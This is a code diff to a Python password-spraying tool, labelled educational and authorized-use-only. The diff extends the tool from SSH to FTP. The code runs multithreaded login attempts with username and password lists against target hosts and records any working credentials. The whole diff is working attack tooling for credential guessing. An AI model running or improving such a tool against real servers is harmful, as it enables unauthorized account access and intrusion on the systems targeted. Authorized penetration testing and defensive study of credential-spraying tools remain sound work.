@@ -16,9 +16,11 @@ disclaimer: This tool was created for educational purposes. Only use this tool o
 import argparse         # Used for command-line arguments.
 import csv              # Used for formatting results into a CSV file.
 import multiprocessing  # Used for multithreading.
-import paramiko         # Connecting to SSH servers.
 import os               # Used to check if the files exist.
 import time             # Used to track how long the program took.
+
+import paramiko as ssh  # Connecting to SSH servers.
+import ftplib as ftp    # Connecting to FTP servers. 
 
 from concurrent.futures import ThreadPoolExecutor
 
@@ -55,9 +57,11 @@ PASSWORD = ""   # A file with a list of potential passwords.
 PROTOCOL = ""   # The protocol being attacked.
 SERVER = ""     # The IPv4 address range.
 TARGETS = ""    # A file with a list of targets.
-PORT = 22        # The port number of the server (22 by default).
+PORT = 0        # The port number of the server (The user must specify the port). If not, it assumes FTP is on 21 and SSH on 22.
 THREADS = 20    # The amount of threads created (20 by default).
 VERBOSE = False # Whether or not to enable verbose (True = On).
+
+SUPPORTED = {"SSH":22, "FTP":21} # A dictionary of supported protocols.
 
 CREDENTIALS = set() # A Python set of valid credentials.
 
@@ -95,7 +99,7 @@ def populate():
 
 def passwordSprayer(targets, usernames, passwords):
     """
-    This function handle the actually password spraying and
+    This function handle the password spraying and
     implements multithreading.
     
     :param targets: The list of targets.
@@ -165,20 +169,40 @@ def connect(targets, username, password):
     for target in targets:
         if credentialsAlreadyExist(target, username):
             break        
-        try:
-            client = paramiko.SSHClient()
-            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            client.connect(target, PORT, username, password, timeout=10)
+        
+        # SSH Connections
+        if PROTOCOL.lower() == "ssh":
+            try:
+                client = ssh.SSHClient()
+                client.set_missing_host_key_policy(ssh.AutoAddPolicy())
+                client.connect(target, PORT, username, password)
                                            
-            CREDENTIALS.add("%s, %s, %s" % (target, username, password))
+                CREDENTIALS.add("%s, %s, %s" % (target, username, password))
 
-            if VERBOSE:
-                print("[!] Credentials Found! ([%s] - %s:%s)" % (target, username, password))
+                if VERBOSE:
+                    print("[!] Credentials Found! ([%s] - %s:%s)" % (target, username, password))
 
-            client.close()
-        except Exception as e:
-            if VERBOSE:
-                print("[!] Credentials Failed! ([%s] - %s:%s)" % (target, username, password))
+                client.close()
+            except Exception as e:
+                if VERBOSE:
+                    print("[!] Credentials Failed! ([%s] - %s:%s)" % (target, username, password))
+
+        # FTP Connections
+        elif PROTOCOL.lower() == "ftp":
+            try:
+                client = ftp.FTP()
+                client.connect(target, PORT)
+                client.login(username, password)
+    
+                CREDENTIALS.add("%s, %s, %s" % (target, username, password))
+
+                if VERBOSE:
+                    print("[!] Credentials Found! ([%s] - %s:%s)" % (target, username, password))
+                
+                client.close()
+            except Exception as e:
+                if VERBOSE:
+                    print("[!] Credentials Failed! ([%s] - %s:%s)" % (target, username, password))
 
 if __name__ == "__main__":
     if args.login is None or args.password is None:
@@ -191,14 +215,18 @@ if __name__ == "__main__":
     LOGIN = args.login
     PASSWORD = args.password
     VERBOSE = args.verbose
-
     TARGETS = args.targets
+
     if TARGETS != "" or TARGETS is not None:
         if not os.path.isfile(TARGETS):
             parser.error("The target file you specified is not a real file on the system!")
-        split = str(args.host).split(":")
-        PROTOCOL = split[0]
-        PORT = split[1]
+        try:
+            split = str(args.host).split(":")
+            PROTOCOL = split[0]
+            PORT = split[1]
+        except IndexError:
+            PROTOCOL = args.host
+            PORT = SUPPORTED[PROTOCOL.upper()]
     else:
         split = str(args.host).split(":")
         PROTOCOL = split[0]
@@ -209,18 +237,23 @@ if __name__ == "__main__":
             print("[!] `%s` is not a valid IPv4 Address! Only IPv4 addresses are supported.\n")
             exit(1)
 
-    if PROTOCOL.lower() != "ssh":
+    # Makes sure a valid protocol is being used.
+    if PROTOCOL.upper() not in SUPPORTED:
         print("[!] The protocol you entered is not currently supported.\n")
         exit(1)
 
-    # Will prevent users from entering strings or invalid port numbers.
-    try:
-        PORT = int(PORT)
-        if PORT < 0 or PORT > 65535:
-            raise ValueError
-    except ValueError as ve:
-        print("[!] {} is not a valid port number.\n".format(PORT))
-        exit(1)
+    # Assigns the default port numbers if one is not provided.
+    if PORT == 0 and PROTOCOL.upper() in SUPPORTED:
+        PORT = SUPPORTED[PROTOCOL.upper()]
+    else:
+        # Will prevent users from entering strings and invalid port numbers.
+        try:
+            PORT = int(PORT)
+            if PORT < 0 or PORT > 65535:
+                raise ValueError
+        except ValueError as ve:
+            print("[!] {} is not a valid port number.\n".format(PORT))
+            exit(1)
     
     # Assigns thread count.
     if args.threads is not None:
